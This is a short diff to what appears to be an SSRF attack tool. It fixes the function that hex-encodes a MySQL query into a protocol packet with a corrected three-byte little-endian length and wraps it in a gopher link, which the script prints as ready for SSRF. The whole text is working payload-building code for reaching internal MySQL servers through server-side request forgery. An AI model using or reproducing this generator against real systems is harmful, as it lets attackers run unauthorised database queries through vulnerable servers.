@@ -24,13 +24,14 @@ def MySQL():
 
     def get_payload(query):
         if(query.strip()!=''):
-        	query = query.encode("hex")
-        	query_length = '{:x}'.format((int((len(query) / 2) + 1)))
-        	pay1 = query_length.rjust(2,'0') + "00000003" + query
-        	final = encode(auth + pay1 + "0100000001")
-        	return final
+            query = query.encode("hex")
+            query_length = '{:06x}'.format((int((len(query) / 2) + 1)))
+            query_length = query_length.decode('hex')[::-1].encode('hex')
+            pay1 = query_length + "0003" + query
+            final = encode(auth + pay1 + "0100000001")
+            return final
         else:
-    	    return encode(auth)
+            return encode(auth)
 
     print "\033[93m" +"\nYour gopher link is ready to do SSRF : \n" + "\033[0m"
     print "\033[04m" + get_payload(query)+ "\033[0m"
